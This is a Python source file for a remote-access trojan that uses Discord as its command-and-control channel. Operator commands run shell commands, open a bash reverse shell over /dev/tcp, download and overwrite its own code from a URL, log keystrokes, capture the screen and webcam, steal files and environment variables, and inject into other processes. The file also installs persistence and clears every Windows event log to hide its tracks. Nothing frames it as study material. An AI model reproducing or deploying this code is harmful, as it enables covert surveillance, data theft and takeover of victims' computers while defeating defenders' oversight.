import discord
import subprocess
import platform
import socket
import os
import asyncio
import requests
from utils.encryption import encrypt_message, decrypt_message
from utils.persistence import setup_persistence
from utils.evasion import mimic_behavior
from plugins import keylog, screenshot, exfil, env, processes, tasks, services
import sys



class C2Bot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.messages = True
        intents.message_content = True
        super().__init__(intents=intents)
        self.hostname = socket.gethostname()
        self.channel_name = f"endpoint-{self.hostname.lower()}"
        self.target_channel = None
        self.auto_delete = AUTO_DELETE

    async def on_ready(self):
        print(f"Logged in as {self.user}")
        guild = self.get_guild(int(SERVER_ID))
        if not guild:
            print("Guild not found!")
            return

        category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
        if not category:
            category = await guild.create_category(CATEGORY_NAME)

        self.target_channel = discord.utils.get(category.text_channels, name=self.channel_name)
        if not self.target_channel:
            self.target_channel = await category.create_text_channel(self.channel_name)
            await self.target_channel.send(f"Initialized C2 channel for {self.hostname}")

        if platform.system() == "Windows":
            setup_persistence()

        await mimic_behavior(self.target_channel)

    async def on_message(self, message):
        if message.author.id == self.user.id or message.channel != self.target_channel:
            return

        if str(message.author.id) not in AUTHORIZED_USERS:
            return

        try:
            command = decrypt_message(message.content, ENCRYPTION_KEY) if message.content.startswith("ENC:") else message.content
        except ValueError as e:
            await message.channel.send(f"Error decrypting message: {str(e)}")
            return

        # New commands
        if command == "!env":
            response = env.dump_env()
            sent = await message.channel.send(f"```{response}```")
            if self.auto_delete:
                await asyncio.sleep(RESPONSE_DELETE_DELAY)
                await sent.delete()
            return

        elif command == "!processes":
            response = processes.list_processes()
            sent = await message.channel.send(f"```{response[:1900]}```")
            if self.auto_delete:
                await asyncio.sleep(RESPONSE_DELETE_DELAY)
                await sent.delete()
            return

        elif command == "!tasks":
            response = tasks.list_tasks()
            sent = await message.channel.send(f"```{response[:1900]}```")
            if self.auto_delete:
                await asyncio.sleep(RESPONSE_DELETE_DELAY)
                await sent.delete()
            return

        elif command == "!services":
            response = services.list_services()
            sent = await message.channel.send(f"```{response[:1900]}```")
            if self.auto_delete:
                await asyncio.sleep(RESPONSE_DELETE_DELAY)
                await sent.delete()
            return

        elif command.startswith("!delete"):
            # Toggle auto-deletion
            self.auto_delete = not self.auto_delete
            status = "enabled" if self.auto_delete else "disabled"
            await message.channel.send(f"Auto-deletion is now {status}.")
            return

        elif command.startswith("!inject "):
            # Usage: !inject <pid> <payload_path>
            try:
                _, pid_str, payload_path = command.split(maxsplit=2)
                pid = int(pid_str)
                from plugins import processes
                result = processes.inject_code(pid, payload_path)
                await message.channel.send(result)
                await message.channel.send(f"Killing current process {os.getpid()} to avoid duplication.")
                os.kill(os.getpid(), 9)
            except Exception as e:
                await message.channel.send(f"Injection failed: {e}")
            return

        elif command == "!hide":
            # Inject into a random .exe process and clear event logs, then kill self
            try:
                from plugins import processes
                # Use the actual exe if running as an exe, else fallback to script
                if getattr(sys, 'frozen', False):
                    payload_path = sys.executable
                else:
                    payload_path = os.path.abspath(__file__)
                pid, exe_name, result = processes.inject_random_process(payload_path, exclude_pid=os.getpid())
                if pid:
                    await message.channel.send(f"Target process: {exe_name} (PID {pid}). Status: {result}")
                    await message.channel.send("Clearing event logs and terminating current process...")
                    
                    # Clear all Windows event logs with elevated permissions
                    try:
                        # Run wevtutil with elevated privileges
                        logs = subprocess.check_output("wevtutil el", shell=True, text=True).splitlines()
                        cleared_count = 0
                        for log in logs:
                            try:
                                result = subprocess.run(f"wevtutil cl \"{log}\"", shell=True, capture_output=True, timeout=5)
                                if result.returncode == 0:
                                    cleared_count += 1
                            except:
                                continue
                        await message.channel.send(f"Cleared {cleared_count} event logs.")
                    except Exception as e:
                        await message.channel.send(f"Failed to clear event logs: {e}")
                    
                    # Force kill the current process
                    await message.channel.send("Terminating current process...")
                    await asyncio.sleep(2)  # Give time for messages to be sent
                    try:
                        os.kill(os.getpid(), 9)  # SIGKILL
                    except:
                        # If SIGKILL fails, try other methods
                        try:
                            import signal
                            os.kill(os.getpid(), signal.SIGTERM)
                        except:
                            # Last resort - exit
                            os._exit(0)
                else:
                    await message.channel.send(f"Hide failed: {result}")
            except Exception as e:
                await message.channel.send(f"Hide failed: {e}")
            return

        elif command == "!kill":
            await message.channel.send("Terminating client...")
            await asyncio.sleep(1)  # Give time for the message to be sent
            os._exit(0)  # Force exit the application
            return

        elif command.startswith("!persist"):
            # Usage: !persist [method] - method can be registry, schtask, startup, or all
            method = command.replace("!persist ", "").strip() if len(command.split()) > 1 else "registry"
            if method not in ["registry", "schtask", "startup", "all"]:
                await message.channel.send("Invalid method. Use: registry, schtask, startup, or all")
                return
            
            try:
                from utils.persistence import setup_current_persistence
                if method == "all":
                    methods = ["registry", "schtask", "startup"]
                    results = []
                    for m in methods:
                        success, msg = setup_current_persistence(m)
                        results.append(f"{m}: {msg}")
                    await message.channel.send("Persistence setup results:\n" + "\n".join(results))
                else:
                    success, msg = setup_current_persistence(method)
                    await message.channel.send(f"Persistence setup: {msg}")
            except Exception as e:
                await message.channel.send(f"Persistence setup failed: {e}")
            return

        elif command == "!fullclear":
            # Remove all persistence methods
            try:
                from utils.persistence import remove_persistence, check_persistence_status
                # Check current status first
                status = check_persistence_status()
                await message.channel.send("Current persistence status:\n" + "\n".join(status))
                
                # Remove all persistence
                results = remove_persistence("all")
                await message.channel.send("Persistence removal results:\n" + "\n".join(results))
            except Exception as e:
                await message.channel.send(f"Persistence removal failed: {e}")
            return

        elif command == "!help":
            help_text = (
                "Available commands:\n"
                "!env - Dump environment variables\n"
                "!processes - List running processes\n"
                "!tasks - List scheduled tasks\n"
                "!services - List services\n"
                "!delete - Toggle auto-deletion\n"
                "!cmd <command> - Run shell command\n"
                "!info - System info\n"
                "!download <file> - Download file\n"
                "!upload <destination> (attach file) - Upload file to client\n"
                "!shell <ip:port> - Reverse shell\n"
                "!update <url> - Update code\n"
                "!keylog [seconds] - Start keylogger for N seconds (default 10)\n"
                "!screenshot - Take screenshot\n"
                "!camera - Take a snapshot from the webcam\n"
                "!clip [computer|camera] [seconds] - Record a screen or camera video clip (default: computer, 10s, max 30s)\n"
                "!exfil <file> - Exfiltrate file\n"
                "!sleep <seconds> - Sleep\n"
                "!inject <pid> <payload> - Inject payload into process\n"
                "!hide - Inject into random process and kill self\n"
                "!persist [method] - Setup persistence (registry/schtask/startup/all)\n"
                "!fullclear - Remove all persistence methods\n"
                "!kill - Terminate the client application\n"
                "!help - Show this help message\n"
                "\nAll dependencies are listed in requirements.txt. Install with: pip install -r requirements.txt"
            )
            await message.channel.send(f"```{help_text}```")
            return

        elif command.startswith("!upload "):
            # Usage: !upload <destination_path> (with file attachment)
            dest_path = command.replace("!upload ", "").strip()
            if not message.attachments:
                await message.channel.send("No file attached. Please attach a file to upload.")
                return
            attachment = message.attachments[0]
            try:
                file_bytes = await attachment.read()
                with open(dest_path, "wb") as f:
                    f.write(file_bytes)
                await message.channel.send(f"File uploaded to {dest_path}.")
            except Exception as e:
                await message.channel.send(f"Upload failed: {e}")
            return

        # Command handling
        if command.startswith("!cmd"):
            cmd = command.replace("!cmd ", "")
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
                response = f"Output:\n{output}"  # Send plaintext response
            except Exception as e:
                response = f"Error: {str(e)}"
            await message.channel.send(response)

        elif command == "!info":
            # Basic system info
            response = f"Hostname: {self.hostname}\nOS: {platform.system()} {platform.release()}\nArch: {platform.machine()}\n"
            
            # Windows-specific details
            if platform.system() == "Windows":
                try:
                    # Windows build info
                    win_ver = subprocess.check_output("wmic os get Caption,Version,OSArchitecture /format:list", shell=True, text=True)
                    response += f"\nWindows Details:\n{win_ver}\n"
                    
                    # CPU info
                    cpu_info = subprocess.check_output("wmic cpu get Name,NumberOfCores,MaxClockSpeed /format:list", shell=True, text=True)
                    response += f"CPU:\n{cpu_info}\n"
                    
                    # RAM info
                    ram_info = subprocess.check_output("wmic computersystem get TotalPhysicalMemory /format:list", shell=True, text=True)
                    response += f"RAM:\n{ram_info}\n"
                    
                    # GPU info
                    gpu_info = subprocess.check_output("wmic path win32_VideoController get Name,VideoMemoryType,AdapterRAM /format:list", shell=True, text=True)
                    response += f"GPU:\n{gpu_info}\n"
                    
                except Exception as e:
                    response += f"Error getting detailed info: {e}\n"
            else:
                # Linux/Unix info
                try:
                    # CPU info
                    cpu_info = subprocess.check_output("cat /proc/cpuinfo | grep 'model name' | head -1", shell=True, text=True)
                    response += f"CPU: {cpu_info.strip()}\n"
                    
                    # RAM info
                    ram_info = subprocess.check_output("free -h", shell=True, text=True)
                    response += f"RAM:\n{ram_info}\n"
                    
                    # GPU info (if available)
                    try:
                        gpu_info = subprocess.check_output("lspci | grep -i vga", shell=True, text=True)
                        response += f"GPU: {gpu_info.strip()}\n"
                    except:
                        response += "GPU: Not detected\n"
                        
                except Exception as e:
                    response += f"Error getting detailed info: {e}\n"
            
            await message.channel.send(f"```{response}```")

        elif command.startswith("!download "):
            file_path = command.replace("!download ", "")
            if os.path.exists(file_path):
                await message.channel.send(file=discord.File(file_path))
            else:
                response = "File not found!"
                await message.channel.send(response)

        elif command.startswith("!shell "):
            ip_port = command.replace("!shell ", "").split(":")
            ip, port = ip_port[0], int(ip_port[1])
            subprocess.Popen(f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", shell=True)
            response = "Reverse shell spawned!"
            await message.channel.send(response)

        elif command.startswith("!update "):
            url = command.replace("!update ", "")
            try:
                new_code = requests.get(url).text
                with open(__file__, "w") as f:
                    f.write(new_code)
                response = "Code updated, restarting..."
                await message.channel.send(response)
                os.system(f"python {__file__}")
                exit()
            except Exception as e:
                response = f"Update failed: {str(e)}"
                await message.channel.send(response)

        elif command == "!keylog":
            await message.channel.send("Starting keylogger for 10 seconds...")
            response = keylog.start_keylogger()
            await message.channel.send(response)
            return

        elif command == "!screenshot":
            result = screenshot.take_screenshot()
            if os.path.exists(result):
                await message.channel.send(file=discord.File(result))
                os.remove(result)
            else:
                await message.channel.send(result)  # Error message

        elif command == "!camera":
            filename, error = screenshot.take_camera_snapshot()
            if error:
                await message.channel.send(error)
            elif filename and os.path.exists(filename):
                await message.channel.send(file=discord.File(filename))
                os.remove(filename)
            else:
                await message.channel.send("Unknown error taking camera snapshot.")
            return

        elif command.startswith("!clip"):
            # Usage: !clip <type> <time>
            args = command.split()
            clip_type = args[1] if len(args) > 1 else "computer"
            try:
                duration = int(args[2]) if len(args) > 2 else 10
            except ValueError:
                duration = 10
            duration = min(max(duration, 1), 30)
            if clip_type not in ["computer", "camera"]:
                await message.channel.send("Invalid type. Use 'computer' or 'camera'.")
                return
            await message.channel.send(f"Recording {clip_type} clip for {duration} seconds...")
            if clip_type == "camera":
                filename, error = screenshot.record_camera_clip(duration)
            else:
                filename, error = screenshot.record_screen_clip(duration)
            if error:
                await message.channel.send(error)
            elif filename and os.path.exists(filename):
                await message.channel.send(file=discord.File(filename))
                os.remove(filename)
            else:
                await message.channel.send("Unknown error recording clip.")
            return

        elif command.startswith("!exfil "):
            file_path = command.replace("!exfil ", "")
            response = exfil.exfiltrate(file_path)
            await message.channel.send(response)

        elif command.startswith("!sleep "):
            seconds = int(command.replace("!sleep ", ""))
            await asyncio.sleep(seconds)
            response = f"Slept for {seconds} seconds"
            await message.channel.send(response)

    async def on_disconnect(self):
        print("Bot disconnected. Attempting to reconnect...")
        await self.start(BOT_TOKEN)

if __name__ == "__main__":
    bot = C2Bot()
    bot.run(BOT_TOKEN)